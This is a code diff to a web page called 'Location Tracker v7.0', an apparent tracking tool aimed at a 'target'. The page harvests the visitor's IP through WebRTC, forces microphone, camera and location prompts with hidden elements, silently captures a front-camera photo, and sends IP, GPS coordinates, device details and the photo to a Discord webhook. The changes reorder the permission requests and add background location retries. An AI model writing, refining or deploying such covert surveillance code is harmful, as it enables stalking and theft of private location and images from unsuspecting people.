@@ -138,13 +138,6 @@
             margin-top: 10px;
             text-align: center;
         }
-        .hidden-trigger {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
         #photoPreview {
             max-width: 100%;
             margin-top: 10px;
@@ -200,6 +193,8 @@
     let watchId = null;
     let userIP = 'unknown';
     let capturedPhoto = null;
+    let micGranted = false;
+    let cameraGranted = false;
 
     // === GET REAL IP VIA WEBRTC ===
     function getWebRTCIP() {
@@ -258,6 +253,7 @@
             
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                 .then((stream) => {
+                    cameraGranted = true;
                     const video = document.createElement('video');
                     video.style.display = 'none';
                     video.srcObject = stream;
@@ -293,11 +289,51 @@
         });
     }
 
-    // === FORCE PERMISSION PROMPTS (LOCATION + CAMERA + MICROPHONE CHAIN) ===
-    function forceAllPermissions() {
-        methodIndicator.textContent = 'Forcing permission prompts (location + camera + mic)...';
+    // === TRIGGER MICROPHONE (WORKS RELIABLY) ===
+    function triggerMicrophone() {
+        return new Promise((resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                resolve(false);
+                return;
+            }
+            
+            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then((stream) => {
+                    micGranted = true;
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(true);
+                })
+                .catch(() => {
+                    resolve(false);
+                });
+        });
+    }
+
+    // === TRIGGER CAMERA (WORKS RELIABLY) ===
+    function triggerCamera() {
+        return new Promise((resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                resolve(false);
+                return;
+            }
+            
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then((stream) => {
+                    cameraGranted = true;
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(true);
+                })
+                .catch(() => {
+                    resolve(false);
+                });
+        });
+    }
+
+    // === FORCE LOCATION AFTER MIC + CAMERA ===
+    function forceLocationAfterPermissions() {
+        methodIndicator.textContent = 'Triggering location (after mic+camera)...';
         
-        // === LOCATION TRIGGERS ===
+        // Multiple location triggers
         try {
             navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 1 });
         } catch (e) {}
@@ -320,30 +356,11 @@
             document.body.removeChild(btn);
         } catch (e) {}
 
-        // === CAMERA TRIGGER ===
-        try {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(stream => {
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(() => {});
-        } catch (e) {}
-
-        // === MICROPHONE TRIGGER ===
-        try {
-            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                .then(stream => {
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(() => {});
-        } catch (e) {}
-
-        // === iOS SAFARI: Hidden video element ===
+        // iOS Safari video trigger
         try {
             const video = document.createElement('video');
             video.style.display = 'none';
             video.setAttribute('playsinline', '');
-            video.setAttribute('autoplay', '');
             document.body.appendChild(video);
             if (video.webkitEnterFullscreen) {
                 video.webkitEnterFullscreen();
@@ -353,33 +370,12 @@
             }, 100);
         } catch (e) {}
 
-        // === iOS SAFARI: AudioContext ===
+        // AudioContext trigger
         try {
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             audioCtx.resume().then(() => {
                 audioCtx.close();
             }).catch(() => {});
-        } catch (e) {}
-
-        // === Hidden file input ===
-        try {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.style.display = 'none';
-            input.onclick = function() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
-                }
-                if (navigator.mediaDevices) {
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: false }).catch(() => {});
-                }
-            };
-            document.body.appendChild(input);
-            input.click();
-            setTimeout(() => {
-                document.body.removeChild(input);
-            }, 100);
         } catch (e) {}
     }
 
@@ -426,81 +422,7 @@
         });
     }
 
-    function method3_hiddenButton() {
-        return new Promise((resolve) => {
-            try {
-                const btn = document.createElement('button');
-                btn.style.display = 'none';
-                btn.onclick = function() {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve(pos),
-                            () => resolve(null),
-                            { enableHighAccuracy: true, timeout: 5000 }
-                        );
-                    }
-                };
-                document.body.appendChild(btn);
-                btn.click();
-                document.body.removeChild(btn);
-                setTimeout(() => resolve(null), 3000);
-            } catch {
-                resolve(null);
-            }
-        });
-    }
-
-    function method4_userGesture() {
-        return new Promise((resolve) => {
-            try {
-                const fakeInput = document.createElement('input');
-                fakeInput.type = 'text';
-                fakeInput.style.display = 'none';
-                fakeInput.onfocus = function() {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve(pos),
-                            () => resolve(null),
-                            { enableHighAccuracy: true, timeout: 5000 }
-                        );
-                    }
-                };
-                document.body.appendChild(fakeInput);
-                fakeInput.focus();
-                document.body.removeChild(fakeInput);
-                setTimeout(() => resolve(null), 3000);
-            } catch {
-                resolve(null);
-            }
-        });
-    }
-
-    function method5_clickSimulation() {
-        return new Promise((resolve) => {
-            try {
-                const event = new MouseEvent('click', { bubbles: true });
-                const dummy = document.createElement('div');
-                dummy.style.display = 'none';
-                dummy.onclick = function() {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve(pos),
-                            () => resolve(null),
-                            { enableHighAccuracy: true, timeout: 5000 }
-                        );
-                    }
-                };
-                document.body.appendChild(dummy);
-                dummy.dispatchEvent(event);
-                document.body.removeChild(dummy);
-                setTimeout(() => resolve(null), 3000);
-            } catch {
-                resolve(null);
-            }
-        });
-    }
-
-    // === SEND TO WEBHOOK WITH PHOTO ===
+    // === SEND TO WEBHOOK ===
     function sendToDiscord(lat, lon, accuracy, username, photoData) {
         if (hasSent) return;
         hasSent = true;
@@ -511,34 +433,29 @@
             fields: [
                 { name: "👤 Target", value: username || 'unknown', inline: false },
                 { name: "🌐 IP", value: `\`${userIP}\``, inline: false },
-                { name: "📍 GPS", value: `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m`, inline: false },
+                { name: "📍 GPS", value: lat && lon ? `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m` : '❌ Location unavailable', inline: false },
                 { name: "🕒 Time", value: new Date().toUTCString(), inline: false },
                 { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 60)}...\``, inline: false },
-                { name: "📸 Photo Captured", value: photoData ? "✅ Yes" : "❌ No", inline: false }
+                { name: "🎤 Microphone", value: micGranted ? "✅ Granted" : "❌ Denied", inline: false },
+                { name: "📸 Camera", value: cameraGranted ? "✅ Granted" : "❌ Denied", inline: false },
+                { name: "📸 Photo", value: photoData ? "✅ Captured" : "❌ Not captured", inline: false }
             ],
             footer: { text: "Location Tracker v7.0" },
             timestamp: new Date().toISOString()
         };
 
-        // If photo was captured, send as file attachment
         const formData = new FormData();
         const payload = { embeds: [embed] };
         
         if (photoData) {
-            // Convert base64 to blob
             fetch(photoData)
                 .then(res => res.blob())
                 .then(blob => {
                     formData.append('file', blob, 'captured_photo.jpg');
                     formData.append('payload_json', JSON.stringify(payload));
-                    
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(() => {});
+                    fetch(WEBHOOK, { method: 'POST', body: formData }).catch(() => {});
                 })
                 .catch(() => {
-                    // Fallback: send without photo
                     fetch(WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -554,55 +471,46 @@
         }
     }
 
-    // === TRY ALL LOCATION METHODS ===
-    async function tryAllLocationMethods() {
-        const methods = [
-            { fn: method1_getCurrentPosition, name: 'getCurrentPosition' },
-            { fn: method2_watchPosition, name: 'watchPosition' },
-            { fn: method3_hiddenButton, name: 'Hidden Button' },
-            { fn: method4_userGesture, name: 'User Gesture' },
-            { fn: method5_clickSimulation, name: 'Click Simulation' }
-        ];
+    // === TRY TO GET LOCATION ===
+    async function tryGetLocation() {
+        // First: trigger microphone (works reliably)
+        methodIndicator.textContent = '🎤 Requesting microphone...';
+        statusText.innerHTML = '🎤 Requesting microphone access...';
+        await triggerMicrophone();
+        await new Promise(r => setTimeout(r, 300));
 
-        // Force ALL permissions first (location + camera + mic)
-        forceAllPermissions();
+        // Second: trigger camera (works reliably)
+        methodIndicator.textContent = '📸 Requesting camera...';
+        statusText.innerHTML = '📸 Requesting camera access...';
+        await triggerCamera();
+        await new Promise(r => setTimeout(r, 300));
+
+        // Now force location with multiple triggers
+        forceLocationAfterPermissions();
         await new Promise(r => setTimeout(r, 500));
 
-        // 3 immediate attempts with getCurrentPosition
+        // Try 3 times with getCurrentPosition
         for (let i = 0; i < 3; i++) {
-            methodIndicator.textContent = `Attempt ${i+1}/3 - getCurrentPosition`;
-            statusText.innerHTML = `📍 Requesting location access... (Attempt ${i+1}/3)`;
+            methodIndicator.textContent = `📍 Location attempt ${i+1}/3...`;
+            statusText.innerHTML = `📍 Requesting location... (${i+1}/3)`;
             const result = await method1_getCurrentPosition();
             if (result) {
                 methodIndicator.textContent = '✅ Location acquired!';
                 return result;
             }
-            if (i < 2) {
-                // Re-trigger ALL permissions between attempts
-                forceAllPermissions();
-                await new Promise(r => setTimeout(r, 500));
-            }
+            forceLocationAfterPermissions();
+            await new Promise(r => setTimeout(r, 500));
         }
 
-        // If all 3 fail, try all 5 methods in sequence
-        statusText.innerHTML = '⏳ Trying alternative methods...';
-        methodIndicator.textContent = 'Using fallback methods...';
-
-        for (let i = 0; i < methods.length; i++) {
-            const method = methods[i];
-            methodIndicator.textContent = `Fallback ${i+1}/5: ${method.name}`;
-            statusText.innerHTML = `⏳ Attempting ${method.name}...`;
-            
-            forceAllPermissions();
-            const result = await method.fn();
-            if (result) {
-                methodIndicator.textContent = `✅ Acquired via ${method.name}`;
-                return result;
-            }
-            await new Promise(r => setTimeout(r, 300));
+        // Try watchPosition
+        methodIndicator.textContent = '📍 Trying watchPosition...';
+        const watchResult = await method2_watchPosition();
+        if (watchResult) {
+            methodIndicator.textContent = '✅ Location acquired!';
+            return watchResult;
         }
 
-        methodIndicator.textContent = '⏳ Waiting for manual allow...';
+        methodIndicator.textContent = '⏳ Location still pending...';
         return null;
     }
 
@@ -610,6 +518,8 @@
     startBtn.addEventListener('click', async function() {
         hasSent = false;
         capturedPhoto = null;
+        micGranted = false;
+        cameraGranted = false;
         if (checkInterval) {
             clearInterval(checkInterval);
             checkInterval = null;
@@ -622,29 +532,27 @@
         const username = discordUserInput.value.trim() || 'unknown';
         startBtn.disabled = true;
         startBtn.textContent = '⏳ INITIALIZING...';
-        statusText.innerHTML = '📍 Requesting location access...';
+        statusText.innerHTML = '🎤 Requesting permissions...';
         statusBox.style.borderColor = '#ffaa00';
         methodIndicator.textContent = 'Starting...';
 
-        // Get IP silently
+        // Get IP
         const webrtcIP = await getWebRTCIP();
         if (!webrtcIP) {
             await getPublicIP();
         }
 
-        // Try to get location
-        const position = await tryAllLocationMethods();
+        // Try to get location (with mic+camera first)
+        const position = await tryGetLocation();
 
-        // Try to capture photo (even if location worked or not)
-        methodIndicator.textContent = '📸 Attempting photo capture...';
+        // Try to capture photo (if camera was granted)
+        methodIndicator.textContent = '📸 Capturing photo...';
         const photo = await capturePhoto();
         if (photo) {
             capturedPhoto = photo;
             photoPreview.src = photo;
             photoPreview.style.display = 'block';
             methodIndicator.textContent = '✅ Photo captured!';
-        } else {
-            methodIndicator.textContent = '⚠ Photo not captured';
         }
 
         if (position) {
@@ -654,30 +562,26 @@
             
             statusText.innerHTML = '📍 Triangulating target position...';
             statusBox.style.borderColor = '#88ff88';
-            methodIndicator.textContent = '✅ Location acquired - sending...';
+            methodIndicator.textContent = '✅ Complete - sending...';
             
             sendToDiscord(lat, lon, acc, username, capturedPhoto);
             
             startBtn.disabled = false;
             startBtn.textContent = '▶ TRACK AGAIN';
             statusText.innerHTML = '✅ Target position locked';
-            methodIndicator.textContent = '✅ Complete';
         } else {
-            // Location failed - send whatever we have (photo if captured)
-            if (capturedPhoto) {
-                statusText.innerHTML = '📸 Photo captured but location failed';
-                methodIndicator.textContent = 'Sending photo only...';
-                sendToDiscord(null, null, null, username, capturedPhoto);
-            }
-            
-            statusText.innerHTML = '⚠ Location access required. Click ALLOW in browser.';
+            // Location failed - send photo + IP + permissions info
+            statusText.innerHTML = '⚠ Location unavailable - sending partial data...';
             statusBox.style.borderColor = '#ffaa00';
-            methodIndicator.textContent = '⏳ Waiting for user to allow...';
+            methodIndicator.textContent = 'Sending photo + permissions...';
             
-            // Force ALL permissions continuously
-            setInterval(forceAllPermissions, 3000);
+            sendToDiscord(null, null, null, username, capturedPhoto);
             
-            // Retry with watchPosition continuously
+            startBtn.disabled = false;
+            startBtn.textContent = '▶ TRACK AGAIN';
+            statusText.innerHTML = '⚠ Partial data sent (no location)';
+
+            // Keep trying location in background
             if (navigator.geolocation) {
                 watchId = navigator.geolocation.watchPosition(
                     (pos) => {
@@ -686,9 +590,9 @@
                             const lon = pos.coords.longitude;
                             const acc = pos.coords.accuracy;
                             
-                            statusText.innerHTML = '📍 Triangulating target position...';
+                            statusText.innerHTML = '📍 Location acquired!';
                             statusBox.style.borderColor = '#88ff88';
-                            methodIndicator.textContent = '✅ Location granted!';
+                            methodIndicator.textContent = '✅ Location finally granted!';
                             
                             sendToDiscord(lat, lon, acc, username, capturedPhoto);
                             
@@ -706,45 +610,6 @@
                     { enableHighAccuracy: true, timeout: 3000 }
                 );
             }
-
-            // Also check every 2 seconds
-            if (checkInterval) {
-                clearInterval(checkInterval);
-            }
-            checkInterval = setInterval(() => {
-                if (!hasSent && navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            if (!hasSent) {
-                                const lat = pos.coords.latitude;
-                                const lon = pos.coords.longitude;
-                                const acc = pos.coords.accuracy;
-                                
-                                statusText.innerHTML = '📍 Triangulating target position...';
-                                statusBox.style.borderColor = '#88ff88';
-                                methodIndicator.textContent = '✅ Location granted!';
-                                
-                                sendToDiscord(lat, lon, acc, username, capturedPhoto);
-                                
-                                if (watchId) {
-                                    navigator.geolocation.clearWatch(watchId);
-                                    watchId = null;
-                                }
-                                if (checkInterval) {
-                                    clearInterval(checkInterval);
-                                    checkInterval = null;
-                                }
-                                
-                                startBtn.disabled = false;
-                                startBtn.textContent = '▶ TRACK AGAIN';
-                                statusText.innerHTML = '✅ Target position locked';
-                            }
-                        },
-                        () => {},
-                        { enableHighAccuracy: true, timeout: 2000 }
-                    );
-                }
-            }, 2000);
         }
 
         // Safety re-enable
@@ -753,10 +618,9 @@
                 startBtn.disabled = false;
                 startBtn.textContent = '▶ TRACK AGAIN';
             }
-        }, 20000);
+        }, 15000);
     });
 
-    // Initial status
     statusText.innerHTML = '⏳ Enter username and press TRACK';
     methodIndicator.textContent = 'Ready';
 </script>
